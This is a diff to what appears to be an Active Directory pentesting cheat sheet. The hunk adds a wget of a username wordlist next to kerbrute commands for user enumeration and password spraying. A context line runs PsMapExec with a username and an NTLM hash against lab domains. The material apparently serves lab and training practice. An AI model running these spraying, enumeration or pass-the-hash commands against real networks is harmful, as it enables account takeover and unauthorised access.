@@ -468,6 +468,8 @@ PsMapExec -Targets All -Domain htb.local -Method SMB -Username user -Hash 9a3121
 ```
 ### kerbrute
 ```bash
+wget https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/master/jsmith.txt
+
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /usr/share/seclists/Usernames/Names/names.txt
 
 kerbrute passwordspray ./userlist Password123! -dc 10.10.10.248 -d active.htb 
